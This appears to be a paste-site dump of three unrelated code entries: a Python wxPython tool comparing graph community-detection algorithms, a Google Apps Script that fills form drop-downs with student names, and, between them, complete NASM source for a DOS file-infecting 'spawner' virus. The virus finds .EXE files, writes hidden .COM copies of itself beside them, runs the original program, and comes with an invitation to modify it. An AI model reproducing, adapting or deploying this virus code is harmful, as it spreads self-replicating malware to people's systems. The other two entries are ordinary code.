id,title,username,language,date,content
        self.Bind(wx.EVT_BUTTON, self.load_graph, self.btn_file)
        self.Bind(wx.EVT_BUTTON, self.set_GT_partition, self.btn_GT)
        self.Bind(wx.EVT_BUTTON, self.set_alg_partition, self.m_btnAlg)

    def onQuit(self, event):
        """"""
		На закрытие
		""""""
        self.Close()

    def on_txt_input(self, event):
        """"""
        В текстовые поля можно вводить только числа
        """"""
        keycode = event.GetKeyCode()
        input_char = chr(keycode)

        if input_char.isdigit() or input_char == '.' or keycode < 27:
            event.Skip()
        else:
            return

    def load_graph(self, event):
        """"""
		Загружаем граф, отображаем атрибуты его вершин в виде радио-бокса 
		""""""
        global G, attribute_names
        with wx.FileDialog(self, ""Выбрать граф..."",
                           wildcard=""Граф GML (*.gml)|*.gml"",
                           style=wx.FD_OPEN | wx.FD_FILE_MUST_EXIST) as fileDialog:
            if fileDialog.ShowModal() == wx.ID_CANCEL:
                event.Skip()
                return None

            path = fileDialog.GetPath().split(""\\"")[-2:]
            self.path_lb.SetLabel(path[0] + ""/"" + path[1])

            G = nx.read_gml(fileDialog.GetPath())
            node_attributes = G.nodes[list(G.nodes())[0]]
            attribute_names = list(node_attributes.keys())

            if not len(attribute_names):
                self.err = wx.StaticText(self.panel132, label=""В графе нет атрибутов"")
                self.sizer132.Add(self.txt, 0, wx.ALL, 10)
            else:
                self.btn_GT.Enable(True)
                self.radio_box = wx.RadioBox(self.panel132, label=""Атрибуты"", choices=attribute_names,
                                             style=wx.RA_SPECIFY_COLS)
                self.sizer132.Add(self.radio_box, 0, wx.ALL, 20)
        return None

    def set_GT_partition(self, event):
        """"""
        Отображаем истинное разбиение, выводим его метрики
        """"""
        global GT

        self.m_nodes.SetLabel(""Узлов: "")
        self.m_edges.SetLabel(""Ребер: "")
        self.m_tr_modularity.SetLabel(""Модулярность: "")
        self.m_tr_silhouette.SetLabel(""Силуэт: "")

        G1 = G.copy()
        selected_attr = attribute_names[self.radio_box.GetSelection()]
        GT = [G1.nodes[node][selected_attr] for node in G1.nodes]
        count_true_comms = len(set(GT))

        true_communities = [[] for _ in range(count_true_comms)]
        for node in G1.nodes():
            true_communities[G1.nodes[node][selected_attr]].append(node)

        self.m_nodes.SetLabel(self.m_nodes.GetLabel() + str(G1.number_of_nodes()))
        self.m_edges.SetLabel(self.m_edges.GetLabel() + str(G1.number_of_edges()))
        self.m_tr_modularity.SetLabel(self.m_tr_modularity.GetLabel() + str(modularity(G1, true_communities)))
        self.m_tr_silhouette.SetLabel(self.m_tr_silhouette.GetLabel() + str(silhouette(G1, true_communities)))

        for node in G1.nodes:
            attrs = G1.nodes[node].copy()
            for key, value in attrs.items():
                if key == selected_attr:
                    G1.nodes[node]['group'] = G1.nodes[node].pop(selected_attr)
                else:
                    del G1.nodes[node][key]

        net = Network(notebook=True, width=500, height=600)

        node_degree = dict(G1.degree)
        nx.set_node_attributes(G1, node_degree, 'size')

        net.from_nx(G1)
        net.show('GT_partitition.html')
        self.webview1.SetPage(net.html, """")
        self.m_btnAlg.Enable(True)

    def set_alg_partition(self, event):
		""""""
        Отображаем разбиение, предложенное алгоримом, рассчитываем и выводим его метрики
        """"""
        self.m_alg_modularity.SetLabel(""Модулярность разбиения: "")
        self.m_alg_silhouette.SetLabel(""Силуэт разбиения: "")
        self.m_ami.SetLabel(""AMI: "")
        self.m_ari.SetLabel(""ARI: "")

        G2 = G.copy()
        for node in G2.nodes:
            attrs = G2.nodes[node].copy()
            for key, _ in attrs.items():
                del G2.nodes[node][key]

        comms = []
        if self.m_L.GetValue():
            comms = [list(comm) for comm in louvain_communities(G, resolution=float(self.m_resTC.GetValue()))]
        elif self.m_GN.GetValue():
            NG_gen = girvan_newman(G)
            limited = itertools.takewhile(lambda c: len(c) <= int(self.m_gnncTC.GetValue()),
                                          NG_gen)  # находим разбиение с нужным числом сообществ
            for com in limited:
                pass
            comms = [list(c) for c in com]
        elif self.m_LPA.GetValue():
            comms = [list(comm) for comm in label_propagation_communities(G)]

        self.m_alg_modularity.SetLabel(self.m_alg_modularity.GetLabel() + str(modularity(G2, comms)))
        self.m_alg_silhouette.SetLabel(self.m_alg_silhouette.GetLabel() + str(silhouette(G2, comms)))

        algo_pred = []
        for node in G2.nodes():
            for i, lst in enumerate(comms):
                if node in lst:
                    algo_pred.append(i)

        self.m_ami.SetLabel(self.m_ami.GetLabel() + str(adjusted_mutual_info_score(GT, algo_pred)))
        self.m_ari.SetLabel(self.m_ari.GetLabel() + str(adjusted_rand_score(GT, algo_pred)))

        algo_pred = {node: algo_pred[i] for i, node in enumerate(G2.nodes)}
        nx.set_node_attributes(G2, algo_pred, 'group')

        net = Network(notebook=True, width=500, height=600)

        node_degree = dict(G2.degree)
        nx.set_node_attributes(G2, node_degree, 'size')

        net.from_nx(G2)
        net.show('alg_partitition.html')
        self.webview2.SetPage(net.html, """")


if __name__ == '__main__':
	app = wx.App()

	frame = MainFrame(None, """")
	frame.Show()

	app.MainLoop()"
gD26k93K,zeno1.asm - Virus - Source Code,FlyFar,ASM (NASM),Sunday 18th of June 2023 10:00:43 PM CDT,";NON-RESIDENT SPAWNER

; I threw this thing together in less than an hour and haven't looked
; at it since so yes, I know it needs real work. Mangle and change as
; you please. The original goal was to create the smallest spawner but
; I got bored with the whole thing. Some of the code was taken from
; the source code to Directory Magic by pcmag. Have phun....





CSEG		SEGMENT
		ASSUME	CS:CSEG,DS:NOTHING

		ORG	100H	;Beginning for .COM programs

START:	JMP MY_BEGIN	;Initialization code is at end


wild            DB  ""*.EXE"",0
file_Ext        DB  ""COM"",0
file_found      DB  12 DUP(' '), 0
file_create     DB  12 DUP(' '), 0
search_attrib   DW  17H
num_infect      dw  0

my_cmd:
Cmd_len         db  13
file_clone      db  12 DUP (' '), 0

		ASSUME	CS:CSEG, DS:CSEG, ES:NOTHING

;------------------------------------------------------------------;
Prepare_command:
	       cld
	       mov    di,OFFSET file_clone
	       mov    al,0
	       mov    cx,12
	       repne scasb          ; find the end of string \0

	       mov    al,0Dh        ; <CR>
	       stosb                ; replace \0 with a <CR>

	       mov    ax,12         ;store length of the command
	       sub    ax,cx
	       mov    cmd_len, al
	       ret

;------------------------------------------------------------------;
Store_name:

	       MOV    DI,OFFSET file_found   ;Point to buffer.
	       MOV    SI,158
	       MOV    CX,12
	       REP MOVSB

	       MOV    DI,OFFSET file_create  ;Point to buffer.
	       MOV    SI,158
	       MOV    CX,12
	       REP MOVSB

	       cld
	       mov    di,OFFSET file_create
	       mov    al,'.'
	       mov    cx,9
	       repne scasb                   ;find the '.'

	       mov    si,OFFSET file_ext
	       mov    cx,3
	       rep movsb                     ;replace the .EXE with .COM

	       ret


;------------------------------------------------------------------;
;Does the file exist?

Check_file:
	       mov    dx,OFFSET file_create
	       mov    cx,0
	       mov    ax,3d00h        ; Open file read only
	       int    21h

Chk_done:
	       ret

;------------------------------------------------------------------;
Infect_file:
;Create file
	       mov    dx,OFFSET file_create
	       mov    cx,0
	       mov    ah,3ch
	       int    21h
	       jc     EXIT

;Write to file
	       mov    bx,ax
	       mov    cx,(OFFSET END_OF_CODE - OFFSET START)
	       mov    dx,OFFSET START
	       mov    ah,40h
	       int    21h

;Close file
	       mov    ah,3eh    ; ASSUMES bx still has file handle
	       int    21h

;Change attributes
	       mov    dx,OFFSET file_create
	       mov    cx,3          ;(1) read only, (2) hidden, (4) system
	       mov    ax,4301h
	       int    21h

	       ret

;------------------------------------------------------------------;
; Read all the directory filenames and store as records in buffer. ;
;------------------------------------------------------------------;

MY_BEGIN:
               mov    sp,offset STACK_HERE      ;move stack down
               mov    bx,sp
               add    bx,15
               mov    cl,4
               shr    bx,cl
               mov    ah,4ah                  ;deallocate rest of memory
               int    21h

               MOV    DI,OFFSET file_clone ;Point to buffer.
	       MOV    SI,OFFSET file_found
	       MOV    CX,12
	       REP MOVSB

READ_DIR:      MOV    DX,OFFSET wild
	       MOV    CX,search_attrib

	       MOV    AH,4EH     ; This finds the first matching file.
	       INT    21H

	       JC     EXIT                   ;If empty directory, exit.

Do_file:
	       call   Store_name

	       call   Check_file
	       jnc    seek_another  ; CF = 0, shadow already there... skip it

	       call   Infect_file
	       jmp    Exit

seek_another:

find_next:
	       mov   ah,4fh
	       int   21h
	       jmp   Do_file

EXIT:

;Run the original program
	       call   Prepare_command
	       mov    si, OFFSET my_cmd
	       int    2Eh                 ;Pass command to command
					  ; interpreter for execution
;Exit to DOS
	       MOV    AX,4C00H
	       INT    21H

END_OF_CODE	=	$

STACK_HERE	EQU   END_OF_CODE + 512

CSEG		ENDS
		END	START"
c99u124H,autofill_form,salimh4art,JavaScript,Sunday 18th of June 2023 09:49:52 PM CDT,"function myFormFunction() {

  // call your form and connect to the drop-down item
  var form = FormApp.openById(""16dzFNWDyQc4ZgUAStVbcvcQQMI82f9ick0egmy-elns"");
  
  var namesList7a = form.getItemById(""52828271"").asListItem(); 
  var namesList7b = form.getItemById(""295858496"").asListItem();
  var namesList7c = form.getItemById(""1191934205"").asListItem();
  var namesList7d = form.getItemById(""291585917"").asListItem();
  var namesList8a = form.getItemById(""1165451515"").asListItem();
  var namesList8b = form.getItemById(""1206974810"").asListItem();
  var namesList8c = form.getItemById(""2116076441"").asListItem();
  var namesList8d = form.getItemById(""1582311487"").asListItem();
  var namesList8e = form.getItemById(""833624427"").asListItem();
  var namesList9a = form.getItemById(""2031338410"").asListItem();
  var namesList9b = form.getItemById(""2110906095"").asListItem();
  var namesList9c = form.getItemById(""1559479098"").asListItem();
  var namesList9d = form.getItemById(""224785650"").asListItem();
  var namesList9e = form.getItemById(""964374570"").asListItem();  
  var namesListgameweb = form.getItemById(""437565053"").asListItem();
  var namesListesmm = form.getItemById(""1534627314"").asListItem();
  var namesListapp = form.getItemById(""1043182774"").asListItem();
  var namesListitvideo = form.getItemById(""899527361"").asListItem();
  var namesListdiniyahfile = form.getItemById(""2062518422"").asListItem();
  //var namesListdiniyahvideo = form.getItemById("""").asListItem();
  var namesListenglish = form.getItemById(""2070362200"").asListItem();

  // identify the sheet where the data resides needed to populate the drop-down
  var ss = SpreadsheetApp.getActive();
  var names = ss.getSheetByName(""datakelas""); 

   // grab the values in the first column of the sheet - use 2 to skip header row
  var namesValues = names.getRange(2, 2, names.getMaxRows() - 1).getValues();
  var namesValues7B = names.getRange(2, 3, names.getMaxRows() - 1).getValues();
  var namesValues7C = names.getRange(2, 4, names.getMaxRows() - 1).getValues();
  var namesValues7D = names.getRange(2, 5, names.getMaxRows() - 1).getValues();
  var namesValues8A = names.getRange(2, 6, names.getMaxRows() - 1).getValues();
  var namesValues8B = names.getRange(2, 7, names.getMaxRows() - 1).getValues();
  var namesValues8C = names.getRange(2, 8, names.getMaxRows() - 1).getValues();
  var namesValues8D = names.getRange(2, 9, names.getMaxRows() - 1).getValues();
  var namesValues8E = names.getRange(2, 10, names.getMaxRows() - 1).getValues();
  var namesValues9A = names.getRange(2, 11, names.getMaxRows() - 1).getValues();
  var namesValues9B = names.getRange(2, 12, names.getMaxRows() - 1).getValues();
  var namesValues9C = names.getRange(2, 13, names.getMaxRows() - 1).getValues();
  var namesValues9D = names.getRange(2, 14, names.getMaxRows() - 1).getValues();
  var namesValues9E = names.getRange(2, 15, names.getMaxRows() - 1).getValues();
  var namesValuesgameweb = names.getRange(2, 16, names.getMaxRows() - 1).getValues();
  var namesValuesesmm = names.getRange(2, 17, names.getMaxRows() - 1).getValues();
  var namesValuesapp = names.getRange(2, 18, names.getMaxRows() - 1).getValues();
  var namesValuesenglish = names.getRange(2, 19, names.getMaxRows() - 1).getValues();
  var namesValuesdiniyahfile = names.getRange(2, 20, names.getMaxRows() - 1).getValues();
  //var namesValuesdiniyahvideo = names.getRange(2, 21, names.getMaxRows() - 1).getValues();
  var namesValuesitvideo = names.getRange(2, 22, names.getMaxRows() - 1).getValues();

  var studentNames = [];
  var studentNames7B = [];
  var studentNames7C = [];
  var studentNames7D = [];
  var studentNames8A = [];
  var studentNames8B = [];
  var studentNames8C = [];
  var studentNames8D = [];
  var studentNames8E = [];
  var studentNames9A = [];
  var studentNames9B = [];
  var studentNames9C = [];
  var studentNames9D = [];
  var studentNames9E = [];
  var studentNamesgameweb = [];
  var studentNamesesmm = [];
  var studentNamesapp = [];
  var studentNamesitvideo = [];
  var studentNamesdiniyahfile = [];
  //var studentNamesdiniyahvideo = [];
  var studentNamesenglish = [];

  // convert the array ignoring empty cells
  for(var i = 0; i < namesValues.length; i++)   
    if(namesValues[i][0] != """")
      studentNames[i] = namesValues[i][0];
      // populate the drop-down with the array data
      namesList7a.setChoiceValues(studentNames);

  //run data 7B
  for(var i = 0; i < namesValues7B.length; i++)   
    if(namesValues7B[i][0] != """")
      studentNames7B[i] = namesValues7B[i][0];
      namesList7b.setChoiceValues(studentNames7B)

  //run data 7C
  for(var i = 0; i < namesValues7C.length; i++)   
    if(namesValues7C[i][0] != """")
      studentNames7C[i] = namesValues7C[i][0];
      namesList7c.setChoiceValues(studentNames7C)

  //run data 7D
  for(var i = 0; i < namesValues7D.length; i++)   
    if(namesValues7D[i][0] != """")
      studentNames7D[i] = namesValues7D[i][0];
      namesList7d.setChoiceValues(studentNames7D)

  //run data 8A
  for(var i = 0; i < namesValues8A.length; i++)   
    if(namesValues8A[i][0] != """")
      studentNames8A[i] = namesValues8A[i][0];
      namesList8a.setChoiceValues(studentNames8A)

  //run data 8B
  for(var i = 0; i < namesValues8B.length; i++)   
    if(namesValues8B[i][0] != """")
      studentNames8B[i] = namesValues8B[i][0];
      namesList8b.setChoiceValues(studentNames8B)

  //run data 8C
  for(var i = 0; i < namesValues8C.length; i++)   
    if(namesValues8C[i][0] != """")
      studentNames8C[i] = namesValues8C[i][0];
      namesList8c.setChoiceValues(studentNames8C)

  //run data 8D
  for(var i = 0; i < namesValues8D.length; i++)   
    if(namesValues8D[i][0] != """")
      studentNames8D[i] = namesValues8D[i][0];
      namesList8d.setChoiceValues(studentNames8D)

  //run data 8E
  for(var i = 0; i < namesValues8E.length; i++)   
    if(namesValues8E[i][0] != """")
      studentNames8E[i] = namesValues8E[i][0];
      namesList8e.setChoiceValues(studentNames8E)

  //run data 9A
  for(var i = 0; i < namesValues9A.length; i++)   
    if(namesValues9A[i][0] != """")
      studentNames9A[i] = namesValues9A[i][0];
      namesList9a.setChoiceValues(studentNames9A)

  //run data 9B
  for(var i = 0; i < namesValues9B.length; i++)   
    if(namesValues9B[i][0] != """")
      studentNames9B[i] = namesValues9B[i][0];
      namesList9b.setChoiceValues(studentNames9B)

  //run data 9C
  for(var i = 0; i < namesValues9C.length; i++)   
    if(namesValues9C[i][0] != """")
      studentNames9C[i] = namesValues9C[i][0];
      namesList9c.setChoiceValues(studentNames9C)

  //run data 9D
  for(var i = 0; i < namesValues9D.length; i++)   
    if(namesValues9D[i][0] != """")
      studentNames9D[i] = namesValues9D[i][0];
      namesList9d.setChoiceValues(studentNames9D)

  //run data 9E
  for(var i = 0; i < namesValues9E.length; i++)   
    if(namesValues9E[i][0] != """")
      studentNames9E[i] = namesValues9E[i][0];
      namesList9e.setChoiceValues(studentNames9E)

  //run data game dan website
  for(var i = 0; i < namesValuesgameweb.length; i++)   
    if(namesValuesgameweb[i][0] != """")
      studentNamesgameweb[i] = namesValuesgameweb[i][0];
      namesListgameweb.setChoiceValues(studentNamesgameweb)


  //run data mulmed dan es
  for(var i = 0; i < namesValuesesmm.length; i++)   
    if(namesValuesesmm[i][0] != """")
      studentNamesesmm[i] = namesValuesesmm[i][0];
      namesListesmm.setChoiceValues(studentNamesesmm)

  //run data apps
  for(var i = 0; i < namesValuesapp.length; i++)   
    if(namesValuesapp[i][0] != """")
      studentNamesapp[i] = namesValuesapp[i][0];
      namesListapp.setChoiceValues(studentNamesapp)

  //run data diniyah
  for(var i = 0; i < namesValuesdiniyahfile.length; i++)   
    if(namesValuesdiniyahfile[i][0] != """")
      studentNamesdiniyahfile[i] = namesValuesdiniyahfile[i][0];
      namesListdiniyahfile.setChoiceValues(studentNamesdiniyahfile)

  //run data it video
  for(var i = 0; i < namesValuesitvideo.length; i++)   
    if(namesValuesitvideo[i][0] != """")
      studentNamesitvideo[i] = namesValuesitvideo[i][0];
      namesListitvideo.setChoiceValues(studentNamesitvideo)

  //run data english project
  for(var i = 0; i < namesValuesenglish.length; i++)   
    if(namesValuesenglish[i][0] != """")
      studentNamesenglish[i] = namesValuesenglish[i][0];
      namesListenglish.setChoiceValues(studentNamesenglish)


}
"
